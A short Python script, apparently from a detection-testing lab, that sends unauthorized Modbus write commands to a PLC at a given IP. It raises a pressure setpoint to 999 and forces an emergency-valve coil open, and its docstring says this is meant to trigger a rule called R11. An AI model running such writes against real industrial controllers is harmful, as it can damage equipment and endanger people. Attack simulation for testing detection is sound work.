#!/usr/bin/env python3
"""Dampak OT: perintah tulis Modbus tanpa izin ke PLC simulasi (memicu R11)."""
import sys

from pymodbus.client import ModbusTcpClient

target = sys.argv[1] if len(sys.argv) > 1 else "172.30.0.20"
client = ModbusTcpClient(target, port=502)
client.connect()
print("baca setpoint:", client.read_holding_registers(0, 2, slave=1).registers)
client.write_register(0, 999, slave=1)       # FC6: setpoint tekanan dinaikkan
client.write_coil(1, True, slave=1)          # FC5: buka katup darurat
print("setelah tulis:", client.read_holding_registers(0, 2, slave=1).registers)
client.close()
